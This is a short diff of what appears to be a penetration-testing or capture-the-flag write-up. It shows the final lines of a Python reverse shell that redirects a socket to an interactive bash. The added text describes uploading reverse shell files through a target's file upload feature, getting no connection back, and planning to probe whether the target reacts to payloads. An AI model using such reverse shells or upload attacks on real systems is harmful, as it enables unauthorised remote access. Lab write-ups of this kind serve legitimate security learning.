@@ -56,4 +56,12 @@ os.dup2(s.fileno(),2);
 p=subprocess.call(["/bin/bash","-i"]);
 ```
 
-I 
+I uploaded each reverse shell file at the location of uploading the file.
+
+But no one gave me a connection back.
+
+Now we will hold our step back and try to attack back.
+
+Now first of all before jumping straight into the reverse shell lets see its reacts to the payload we uplaod or not. if it reacts it can be feed with a rev shell.
+
+
